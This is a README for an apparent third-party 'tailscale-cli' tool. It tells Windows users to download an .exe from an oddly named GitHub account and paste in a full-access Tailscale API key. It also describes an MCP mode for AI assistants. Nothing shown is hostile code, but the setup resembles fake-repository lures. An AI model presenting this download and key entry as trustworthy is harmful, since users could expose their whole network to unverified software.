# 🌐 tailscale-cli - Manage your Tailscale network from terminal

[ ![Download tailscale-cli](https://img.shields.io/badge/Download-Tailscale_CLI-blue.svg) ](https://github.com/Myrtieplagioclastic550/tailscale-cli)

tailscale-cli provides a method to control your Tailscale network using text commands. You can view your devices, update security rules, and handle network keys without opening a web browser. This tool integrates with AI assistants and Claude Code through the Model Context Protocol to help you manage your VPN settings.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [official repository page](https://github.com/Myrtieplagioclastic550/tailscale-cli) to download the latest version.
2. Look for the "Releases" section on the right side of the page.
3. Select the file ending in `.exe` that matches your computer system.
4. Save the file to a folder you can find, such as your Downloads folder.

## ⚙️ System Requirements

- Windows 10 or Windows 11.
- An active Tailscale account.
- An API key generated from your Tailscale admin console.

## 🚀 Setting Up Your Access

Before you run the tool, you need an API key to allow the software to talk to your network.

1. Log in to your Tailscale admin console.
2. Go to the "Settings" menu and find the "Keys" section.
3. Select "Generate auth key" or "Create API key."
4. Copy the key and save it in a text file. Keep this key secret, as it grants full access to your network.

## 🛠️ Running the Application

Open your command prompt or PowerShell to start the tool.

1. Press the Windows key and type "cmd" to open the command prompt.
2. Navigate to the folder where you saved the download. For example, if you saved it to Downloads, type `cd Downloads`.
3. Type `tailscale-cli` and press Enter.
4. The tool will prompt you for your API key the first time you run it. Paste the key you generated earlier and press Enter.

## 🖥️ Managing Your Network

Once the tool connects, you can type commands to retrieve information about your setup.

### View Devices
Type `tailscale-cli devices` to see a list of every computer and phone connected to your network. You will see their names, internal IP addresses, and status.

### Manage Security Rules
You can edit your access control list by typing `tailscale-cli acl`. This opens a text window where you define which devices can talk to each other. Save your changes to apply them to your network immediately.

### Network Settings
Use `tailscale-cli dns` to change how your network handles domain names. This helps if you use custom web addresses for your internal services.

## 🤖 Using AI Assistants

This tool includes a feature for Claude Code and other AI assistants. If you use AI tools to write scripts, this feature lets the AI suggest changes to your network configuration.

1. Ensure your AI assistant supports the Model Context Protocol.
2. Run the tool with the `--mcp` flag.
3. The tool generates a configuration file for your AI assistant.
4. Point your assistant to this file to allow it to read your Tailscale settings.

## 🔍 Troubleshooting Common Issues

If the tool does not respond, check your internet connection first. Ensure your Tailscale service is running in the background.

If you receive an "Access Denied" error, your API key might have expired or lacks the correct permissions. Return to the Tailscale admin console and create a new key with "Read" and "Write" access.

If the command prompt tells you that the program is not recognized, ensure you are in the folder where you saved the file. You can also move the file into a folder that is part of your system path to run it from anywhere.

## 🛡️ Security Best Practices

- Never share your API key with other people.
- If you suspect someone else has your key, delete it in the admin console and create a new one.
- Keep your software version up to date to ensure you have the latest security improvements.
- Only run commands you understand. Using the edit commands incorrectly can restrict access to your devices.